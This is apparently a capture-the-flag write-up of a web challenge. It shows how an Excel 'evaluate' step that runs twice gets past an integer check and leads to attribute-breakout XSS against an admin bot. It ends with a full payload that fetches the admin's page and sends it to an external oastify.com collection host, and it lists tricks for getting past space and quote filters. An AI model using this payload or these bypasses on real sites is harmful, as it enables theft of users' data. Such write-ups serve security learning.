
After reading around the code we can see some interesting EXCEL processing happening. I realized we can only input numbers for the rank and this is cool because
there's also some custom JINJA styling function.

<img width="479" alt="Screenshot 2024-11-22 at 4 25 07 PM" src="https://github.com/user-attachments/assets/634a2ea8-ed61-430a-b6d2-877858e043e1">
<img width="852" alt="Screenshot 2024-11-22 at 4 24 56 PM" src="https://github.com/user-attachments/assets/dd6303aa-4d80-4850-aec6-a4fc24f48ca1">


Also another interesting thing is "evaluate", so this will actually evaluate excel functions. I thought of RCE, but then realized there's a bot.py so this is definitely XSS.

I realized if I can get something to evaluate and somehow change a value I can bypass this check, this is because .evaluate is ran TWICE, the second time with no 
type checking.

<img width="553" alt="Screenshot 2024-11-22 at 4 26 25 PM" src="https://github.com/user-attachments/assets/07946a11-5350-42e2-baa1-f901ba34c347">


Moreover, I realized they're using Column **E** as well, so I just wrote up a simple function to dynamically change the value of "rank" so I can inject and
break out of the attribute (can be seen in the style( ) function dict2attributes HTML).

<img width="432" alt="Screenshot 2024-11-22 at 4 27 25 PM" src="https://github.com/user-attachments/assets/39cb3d00-61c8-4e20-956b-ea58fa4a5c28">


Here is the technique to bypass their integer checks:
<img width="737" alt="Screenshot 2024-11-22 at 4 28 05 PM" src="https://github.com/user-attachments/assets/7ff1661f-4947-4be6-8a05-ea2f716388da">


ALright, here were some of the issues I encountered:
1) There is HTTPOnly set on the Flask session cookies by default, so we can't steal it using document.cookie
2) No spaces can be used (it breaks the custom Jinja style() function) -> to get around this I used **/** before onerror, and the browser will "fix" it for us by replacing it with a **[SPACE]**
3) No double quotes can be used -> used single quotes
4) To get the flag I tried making a request to internal redis://. and then the admin's /my_races, which worked.


I used Burp collaborator (you can use free services, a lot of them have limits which can be annoying):

If you read the docker files you can see it runs on localhost:5000, I also uploaded a document.local.href, just to ensure:

Solution:
1"/onerror=fetch('http://localhost:5000/my_races').then(response=>response.text()).then(data=>{fetch('https://j7rgotwyb2h2mvoq7ajz38780z6quhi6.oastify.com/?stolencookie='+btoa(data.slice(0,5000))).then(innerResponse=>innerResponse.text()).then(innerData=>console.log(innerData)).catch(innerError=>console.error('InnerError:',innerError));}).catch(error=>console.error('Error:',error))


<img width="1087" alt="Screenshot 2024-11-22 at 4 30 53 PM" src="https://github.com/user-attachments/assets/e3c1d448-1330-43f0-9657-0605cadd1367">


<img width="717" alt="Screenshot 2024-11-22 at 4 31 18 PM" src="https://github.com/user-attachments/assets/84cdee6f-ab36-46c5-822f-1995187f62e0">

